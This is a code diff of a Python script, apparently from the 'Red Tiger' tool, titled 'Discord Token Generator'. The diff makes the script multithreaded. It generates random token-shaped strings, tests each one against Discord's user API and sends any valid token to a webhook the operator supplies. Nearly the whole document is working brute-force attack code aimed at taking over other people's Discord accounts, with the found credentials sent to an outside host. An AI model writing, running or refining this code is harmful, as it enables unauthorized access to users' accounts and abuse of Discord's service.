@@ -4,68 +4,81 @@ import string
 import requests
 import json
 import random
-
+import threading
 Title("Discord Token Generator")
 
-def send_embed_webhook(webhook_url, embed_content, username=None, url=None):
-                payload = {
-                'embeds': [embed_content],
-                'username': username,
-                'avatar_url': url
-                 }
+webhook = input(f"{color.RED}\n{INPUT} Webhook ? (y/n) -> {color.RESET}")
+if webhook in ['y', 'Y', 'Yes', 'yes', 'YES']:
+    webhook_url = input(f"{color.RED}{INPUT} Webhook URL -> {color.RESET}")
+    try:
+        response = requests.head(webhook_url)
+        if response.status_code != 200:
+            ErrorWebhook()
+        else:
+            print(f"{color.RED}{INFO} Webhook Valid.")
+    except:
+        ErrorWebhook()
 
-                headers = {
-            'Content-Type': 'application/json'
-             }
+try:
+    threads_number = int(input(f"{INPUT} Threads Number -> {color.RESET}"))
+except:
+    ErrorNumber()
 
-                response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
-username = 'Red Tiger'
-url = 'https://cdn.discordapp.com/attachments/1184160374342299688/1184160439001686056/IMG_1506.png?ex=658af659&is=65788159&hm=9a0297ee590e78acbafc75bc4686ce2b553e40a2f2a850101378a09f23e32d08&'
-webhook = input(f"{color.RED}\n{INPUT} Webhook ? (y, n) -> {color.RESET}")
-if webhook in ['y']:
-    webhook_url = input(f"{color.RED}{INPUT} URL Webhook -> {color.RESET}")
-def token_check(token):
+
+def send_webhook(embed_content):
+    payload = {
+    'embeds': [embed_content],
+    'username': username_webhook,
+    'avatar_url': avatar_webhook
+    }
+
+    headers = {
+    'Content-Type': 'application/json'
+    }
+
+    requests.post(webhook_url, data=json.dumps(payload), headers=headers)
+
+def token_check():
+    first = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([24, 26])))
+    second = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([6])))
+    third =  ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([38])))
+    token = f"{first}.{second}.{third}"
 
     try:
-        result = requests.get('https://discordapp.com/api/v9/auth/login', headers={'Authorization': token})
-        
-        
-        if webhook in ['y']:
-            if result.status_code == 200:
-             print(f"{color.GREEN}{ADD} Token Found | {color.WHITE}{token}{color.RESET}")
-             embed_content = {
-           'title': f'Token Found !',
-           'description': f"**__Token:__**\n```{token}```",
-           'color': color_webhook,
-           'footer': {
-            "text": "Red Tiger",
-            "icon_url": "https://media.discordapp.net/attachments/944760272265031720/1179429697495498834/IMG_1506.png?ex=6582fb00&is=65708600&hm=cbdc48779b762d4d7c95c34bb68a8aabf8314519d0b50c4d7371bea19eac5db4&=&format=webp&quality=lossless",
-             }
-            }
-
-             send_embed_webhook(webhook_url, embed_content, username, url)
-
-
+        try:
+            user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
+            user['username']
+            if webhook in ['y']:
+                embed_content = {
+                'title': f'Token Valid !',
+                'description': f"**__Token:__**\n```{token}```",
+                'color': color_webhook,
+                'footer': {
+                "text": username_webhook,
+                "icon_url": avatar_webhook,
+                }
+                }
+                send_webhook(embed_content)
+                print(f"{GEN_VALID} Status:  {color.WHITE}Valid{color.GREEN}  | Token: {color.WHITE}{token}{color.GREEN}")
             else:
-                  print(f"{color.RED}{ERROR} | Token Invalid | {color.WHITE}{token}{color.RESET}")
-        if webhook in ['n']:
-             if result.status_code == 200:
-                print(f"{color.GREEN}{ADD} | Token Found | {color.WHITE}{token}{color.RESET}")
-             else:
-                  print(f"{color.RED}{ERROR} | Token Invalid | {color.WHITE}{token}{color.RESET}")
-             
-
+                print(f"{GEN_VALID} Status:  {color.WHITE}Valid{color.GREEN}  | Token: {color.WHITE}{token}{color.GREEN}")
+        except:
+            print(f"{GEN_INVALID} Status: {color.WHITE}Invalid{color.RED} | Token: {color.WHITE}{token}{color.RED}")
     except:
-        print(f"{color.RED}{ERROR} Token Invalid | {color.WHITE}{token}{color.RESET}")
+        print(f"{GEN_INVALID} Status: {color.WHITE}Error{color.RED} | Token: {color.WHITE}{token}{color.RED}")
+
+def request():
+    threads = []
+    try:
+        for _ in range(int(threads_number)):
+            t = threading.Thread(target=token_check)
+            t.start()
+            threads.append(t)
+    except:
+        ErrorNumber()
+
+    for thread in threads:
+        thread.join()
 
 while True:
-    def generate_random_string(length):
-        characters = string.ascii_letters + string.digits + "._"
-        return ''.join(random.choices(characters, k=length))
-
-    random_string = generate_random_string(random.randint(60, 75))
-    
-    token = random_string
-
-    token_check(token)
-    Title(f"Discord Token Generator | Token: {token}")
+    request()
